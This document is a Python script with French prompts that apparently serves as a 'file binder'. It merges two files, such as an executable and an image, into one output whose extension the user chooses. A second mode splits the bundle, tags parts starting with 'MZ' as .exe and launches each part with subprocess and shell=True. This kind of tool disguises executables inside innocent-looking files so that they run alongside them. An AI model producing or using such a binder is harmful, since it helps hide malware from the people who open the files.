import os
import time
import sys
import subprocess

def loading_animation(duration=3):
    """Affiche une animation de chargement."""
    for _ in range(duration * 4):
        for symbol in "|/-\\":
            sys.stdout.write(f"\rFusion en cours... {symbol}")
            sys.stdout.flush()
            time.sleep(0.25)
    print("\nFusion terminee !")

def bind_files(output_file, file1, file2):
    """Fusionne deux fichiers en un seul avec un separateur unique."""
    separator = b"--FILE_SEPARATOR--"
    
    with open(output_file, 'wb') as outfile:
        for file in (file1, file2):
            if os.path.exists(file):
                with open(file, 'rb') as infile:
                    outfile.write(infile.read() + separator)
            else:
                print(f"Fichier introuvable : {file}")
    loading_animation()
    print(f"Fichiers fusionnes et sauvegardes sous : {output_file}")

def extract_and_execute(output_file):
    """Extrait et execute les fichiers fusionnes a la volee."""
    separator = b"--FILE_SEPARATOR--"
    
    with open(output_file, 'rb') as infile:
        content = infile.read()
    
    parts = content.split(separator)
    
    for i, part in enumerate(parts[:-1]):
        extracted_file = f"extracted_file_{i}"
        with open(extracted_file, 'wb') as f:
            f.write(part)
        
       
        if part[:2] == b"MZ":  
            extracted_file += ".exe"
        elif part[:4] == b"\x89PNG":  
            extracted_file += ".png"
        elif part[:2] == b"\xFF\xD8":  
            extracted_file += ".jpg"
        
        os.rename(f"extracted_file_{i}", extracted_file)
        
        
        if os.name != "nt":
            os.chmod(extracted_file, 0o755)
        
        try:
            subprocess.Popen([extracted_file], shell=True)
        except Exception as e:
            print(f"Erreur lors de l'execution de {extracted_file} : {e}")

if __name__ == "__main__":
    mode = input("Voulez-vous (1) Fusionner des fichiers ou (2) Executer un fichier fusionne ? (1/2) : ")
    
    if mode == "1":
        file1 = input("Entrez le chemin du premier fichier : ")
        file2 = input("Entrez le chemin du deuxieme fichier : ")
        output_format = input("Entrez le format du fichier de sortie (ex: .exe, .jpg, .png) : ")
        output = "combined_output" + output_format
        bind_files(output, file1, file2)
    elif mode == "2":
        output_file = input("Entrez le fichier fusionne a executer : ")
        extract_and_execute(output_file)
